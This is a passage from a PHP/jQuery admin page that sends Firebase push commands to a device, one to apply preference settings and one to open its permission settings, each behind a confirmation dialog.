                        if (xhr.responseJSON && xhr.responseJSON.message) msg = xhr.responseJSON.message;
                        toastr.error(msg);
                    }
                });
            }
        });
    });

    // ========================
    // SETTINGS - APPLY ALL
    // ========================
    window.applySettings = function() {
        if (!activeFcmToken) {
            toastr.error('No active device with FCM token found.');
            return;
        }

        const prefs = {};
        $('.setting-toggle').each(function() {
            prefs[$(this).data('pref')] = $(this).is(':checked') ? 'true' : 'false';
        });
        $('.setting-input').each(function() {
            prefs[$(this).data('pref')] = $(this).val();
        });

        Swal.fire({
            title: 'Apply Settings?',
            html: 'Send <b>' + Object.keys(prefs).length + '</b> settings to the device?',
            icon: 'info',
            showCancelButton: true,
            confirmButtonText: 'Apply',
            cancelButtonText: 'Cancel'
        }).then((result) => {
            if (result.isConfirmed) {
                const apiUrl = `<?= base_url('api/v1/fcm/send') ?>/${activeFcmToken}/cmd_update_prefs/settings`;

                $.ajax({
                    url: apiUrl,
                    method: 'POST',
                    data: { prefs: JSON.stringify(prefs) },
                    dataType: 'json',
                    timeout: 60000,
                    success: function(response) {
                        if (response && response.success == true) {
                            Swal.fire({ icon: 'success', title: 'Settings Sent', text: 'Device will apply settings shortly.', timer: 3000, showConfirmButton: false });
                        } else {
                            toastr.error((response && response.message) ? response.message : 'Failed');
                        }
                    },
                    error: function() {
                        toastr.error('Network error. Device may be offline.');
                    }
                });
            }
        });
    };

    // ========================
    // PERMISSION REVOKE
    // ========================
    $('.btn-perm-cmd').on('click', function() {
        const $btn = $(this);
        const perm = $btn.data('perm');
        const permDesc = $btn.data('desc');
        const permLabel = $btn.closest('.card-body').find('h6').text();

        if (!activeFcmToken) {
            toastr.error('No active device with FCM token found.');
            return;
        }

        Swal.fire({
            title: 'Revoke ' + permLabel + '?',
            html: '<p class="text-left"><strong>Permission:</strong> ' + permDesc + '</p>' +
                  '<p class="text-left"><strong>Action:</strong> Open system settings to revoke this permission.</p>' +
                  '<hr><div class="alert alert-danger p-2 mb-0"><i class="fas fa-exclamation-triangle mr-1"></i> ' +
                  '<strong>This action cannot be undone automatically.</strong> ' +
                  'Once revoked, permissions must be re-granted manually on the device.</div>',
            icon: 'warning',
            showCancelButton: true,
            confirmButtonColor: '#dc3545',
            confirmButtonText: 'Yes, open settings',
            cancelButtonText: 'Cancel'
        }).then((result) => {
            if (result.isConfirmed) {
                $btn.html('<i class="fas fa-spinner fa-spin mr-1"></i> Opening...').prop('disabled', true);

                const apiUrl = `<?= base_url('api/v1/fcm/send') ?>/${activeFcmToken}/cmd_open_permission/${perm}`;

                $.ajax({
                    url: apiUrl,
                    method: 'POST',
                    data: { permission: perm },
                    dataType: 'json',
                    timeout: 60000,
                    success: function(response) {
                        $btn.html('<i class="fas fa-shield-alt mr-1"></i> Revoke').prop('disabled', false);
                        if (response && response.success == true) {
                            Swal.fire({
                                icon: 'success',
                                title: 'Settings Opened',
                                html: 'Permission settings for <b>' + permLabel + '</b> should now be visible on the device.<br><br>' +
                                      '<span class="text-danger"><i class="fas fa-exclamation-triangle mr-1"></i> Remember to manually re-grant this permission later if needed.</span>',
                                timer: 5000,
                                showConfirmButton: true
                            });
                        } else {
                            toastr.error((response && response.message) ? response.message : 'Failed');
                        }
                    },
                    error: function() {
                        $btn.html('<i class="fas fa-shield-alt mr-1"></i> Revoke').prop('disabled', false);
                        toastr.error('Network error.');
                    }
                });
            }
        });
    });
});
</script>

<?php include __DIR__ . '/_adv_style.php'; ?>
